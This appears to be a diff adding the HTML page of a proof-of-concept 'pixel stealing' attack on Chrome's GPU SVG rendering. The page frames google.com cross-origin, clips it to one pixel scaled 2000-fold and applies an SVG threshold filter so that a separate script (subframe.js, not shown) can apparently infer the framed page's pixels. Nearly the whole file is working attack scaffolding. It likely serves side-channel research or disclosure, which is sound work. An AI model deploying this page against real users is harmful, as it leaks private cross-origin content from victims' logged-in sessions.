@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Security-Policy" content="frame-src http://0.0.0.0:8000/ https://www.google.com/">
+  <title>SVG on Chrome GPU Pixel Stealing, pixel page</title>
+  <style>
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      padding: 0;
+    }
+  </style>
+  <script src="subframe.js"></script>
+</head>
+
+
+<body>
+    <div id="scroll" style="
+        clip-path: path('M 0 0 H 1 V 1 H -1 z'); 
+        overflow: hidden;
+        height: 1px;
+        width: 1px;
+        filter: url(#threshold);
+	      transform: scale(2000);
+        transform-origin: 0 0;
+    ">
+        <iframe id="frameinner" style="width:2000px;height:2000px;" frameborder="0" scrolling="no"
+          src="https://www.google.com/"></iframe>
+    </div>
+    <svg height="0">
+        <filter id="threshold">
+        	<feColorMatrix type="matrix" values=" 0.21 0.72 0.07 0 0
+                      	                	      0.21 0.72 0.07 0 0
+                        	                      0.21 0.72 0.07 0 0
+                                	              0    0    0    1 0 " />
+       		<feComponentTransfer>
+        		<feFuncR type="discrete" tableValues="0 1" />
+        		<feFuncG type="discrete" tableValues="0 1" />
+        		<feFuncB type="discrete" tableValues="0 1" />
+        	</feComponentTransfer>
+	      </filter> 
+    </svg> 
+</body>
+
+</html>
